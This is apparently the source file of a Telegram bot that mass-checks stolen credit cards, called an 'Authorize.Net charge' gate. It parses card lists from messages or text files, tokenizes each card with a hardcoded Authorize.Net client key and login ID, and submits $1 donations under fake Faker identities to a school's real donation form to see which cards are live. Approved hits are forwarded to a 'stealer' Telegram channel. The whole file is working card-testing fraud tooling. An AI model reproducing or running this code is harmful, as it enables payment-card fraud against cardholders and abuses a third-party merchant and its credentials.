import time
import asyncio
import re
import os
import json
import random
import threading
import httpx
from faker import Faker
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Initialize Faker
fake = Faker()

# Configuration
GATE_NAME = "Authorize.Net charge"
CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
API_LOGIN_ID = "93HEsxKeZ4D"
BASE_URL = "https://www.jetsschool.org"
FORM_ID = "6913"
AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"

# Limits
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# Owner DM Link (clickable ㊕)
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

# File locks for thread safety (if using threads)
file_lock = threading.Lock()

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    """Send approved card to stealer channel (NO CC, NO BIN, NO Bank, NO Country)"""
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[Stealer Error] {e}")

async def call_authorize_api(fullcc, proxy=None):
    """Call Authorize.Net API to check credit card"""
    try:
        cc, mm, yy, cvv = fullcc.split("|")
        
        async with httpx.AsyncClient(timeout=60, follow_redirects=True) as session:
            user_agent = fake.user_agent()
            session.headers.update({
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            })
            
            # Get initial cookies
            try:
                url = f"{BASE_URL}/donate/?form-id={FORM_ID}"
                await session.get(url, timeout=20)
            except Exception:
                pass
            
            # Step 1: Tokenize CC
            expire_token = f"{mm}{yy[-2:]}"
            timestamp = str(int(time.time() * 1000))
            
            payload = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {
                        "name": API_LOGIN_ID,
                        "clientKey": CLIENT_KEY
                    },
                    "data": {
                        "type": "TOKEN",
                        "id": timestamp,
                        "token": {
                            "cardNumber": cc,
                            "expirationDate": expire_token,
                            "cardCode": cvv
                        }
                    }
                }
            }
            
            headers = {
                "Content-Type": "application/json",
                "Origin": BASE_URL,
                "Referer": f"{BASE_URL}/",
                "User-Agent": user_agent
            }
            
            resp = await session.post(AUTHORIZE_API_URL, json=payload, headers=headers, timeout=20)
            data = resp.json()
            
            if data.get("messages", {}).get("resultCode") == "Ok":
                descriptor = data["opaqueData"]["dataDescriptor"]
                value = data["opaqueData"]["dataValue"]
            else:
                msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization Failed")
                return "Declined ❌", msg, GATE_NAME, "0s"
            
            # Step 2: Get form hash
            try:
                page_resp = await session.get(f"{BASE_URL}/donate/?form-id={FORM_ID}", timeout=20)
                hash_match = re.search(r'name="give-form-hash" value="(.*?)"', page_resp.text)
                if not hash_match:
                    return "Error", "Could not find give-form-hash", GATE_NAME, "0s"
                form_hash = hash_match.group(1)
            except Exception:
                return "Error", "Failed to load donation page", GATE_NAME, "0s"
            
            # Step 3: Submit donation
            first_name = fake.first_name()
            last_name = fake.last_name()
            email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
            
            data = {
                "give-form-id": FORM_ID,
                "give-form-title": "Donate",
                "give-current-url": f"{BASE_URL}/donate/?form-id={FORM_ID}",
                "give-form-url": f"{BASE_URL}/donate/",
                "give-form-minimum": "1.00",
                "give-form-maximum": "999999.99",
                "give-amount": "1.00",
                "payment-mode": "authorize",
                "give_first": first_name,
                "give_last": last_name,
                "give_email": email,
                "give_authorize_data_descriptor": descriptor,
                "give_authorize_data_value": value,
                "give_action": "purchase",
                "give-gateway": "authorize",
                "give-form-hash": form_hash,
                "card_address": fake.street_address(),
                "card_city": fake.city(),
                "card_state": fake.state_abbr(),
                "card_zip": fake.zipcode(),
                "billing_country": "US",
                "card_number": "0000000000000000", 
                "card_cvc": "000",
                "card_name": "0000000000000000",
                "card_exp_month": "00",
                "card_exp_year": "00",
                "card_expiry": "00 / 00"
            }
            
            resp = await session.post(
                f"{BASE_URL}/donate/?payment-mode=authorize&form-id={FORM_ID}", 
                data=data, 
                timeout=30
            )
            text = resp.text.lower()
            
            # Check for success messages
            if "donation confirmation" in text or "thank you" in text or "payment complete" in text:
                return "Approved ✅", "Payment Successful! ❤️", GATE_NAME, "0s"
            
            # Extract error message from website response
            elif "declined" in text or "error" in text:
                # Try to find error in give_error class
                err_match = re.search(r'class="give_error">(.*?)<', resp.text, re.IGNORECASE | re.DOTALL)
                if err_match:
                    error_msg = err_match.group(1).strip()
                    error_msg = re.sub(r'<[^>]+>', '', error_msg)
                    error_msg = re.sub(r'\s+', ' ', error_msg).strip()
                    return "Declined ❌", error_msg, GATE_NAME, "0s"
                
                # Try to find any error message on the page
                err_match = re.search(r'<(?:div|p|span)[^>]*class="[^"]*(?:error|alert|warning|notice)[^"]*"[^>]*>(.*?)</', resp.text, re.IGNORECASE | re.DOTALL)
                if err_match:
                    error_msg = err_match.group(1).strip()
                    error_msg = re.sub(r'<[^>]+>', '', error_msg)
                    error_msg = re.sub(r'\s+', ' ', error_msg).strip()
                    return "Declined ❌", error_msg, GATE_NAME, "0s"
                
                return "Declined ❌", "Transaction Declined", GATE_NAME, "0s"
            else:
                return "Declined ❌", "Unknown Response", GATE_NAME, "0s"
                
    except Exception as e:
        return "Error", str(e)[:50], GATE_NAME, "0s"

# ═══════════════════════════════════════════════════════════════════════════════
# BOT COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

# --- SINGLE CHECK COMMAND (/auth) ---
@Client.on_message(filters.command("auth", [".", "/"]))
async def authorize_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]
        
        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /auth

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /auth cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME
        
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)

        start = time.perf_counter()
        status, response, gateway, time_taken = await call_authorize_api(fullcc)
        
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)

        if "Approved" in status or "✅" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        finalresp = f"""{status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        
        await setantispamtime(user_id)
        await deductcredit(user_id)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS TEXT/REPLY COMMAND (/mauth) ---
@Client.on_message(filters.command("mauth", [".", "/"]))
async def authorize_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mauth

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mauth cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE COMMAND (/tauth) ---
@Client.on_message(filters.command("tauth", [".", "/"]))
async def authorize_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tauth

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC (with progress, separate approved, declined summary) ---
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    # Initial progress message
    progress_text = f"""Authorize.Net Auth
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved: 0
Declined: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""

    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed

        status, response, gateway, time_taken = await call_authorize_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response,
                "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            # Send to stealer (no CC/BIN)
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        # Update progress message
        try:
            await Client.edit_message_text(
                message.chat.id,
                progress_msg.id,
                f"""Authorize.Net Auth
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved: {approved_count}
Declined: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass

        await asyncio.sleep(0.5)

    # Delete progress message
    await progress_msg.delete()

    # Send each approved card as separate message (full details)
    for card in approved_cards:
        approved_msg = f"""{card['status']}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    # Send declined summary
    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅs

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
            quote=True,
            parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
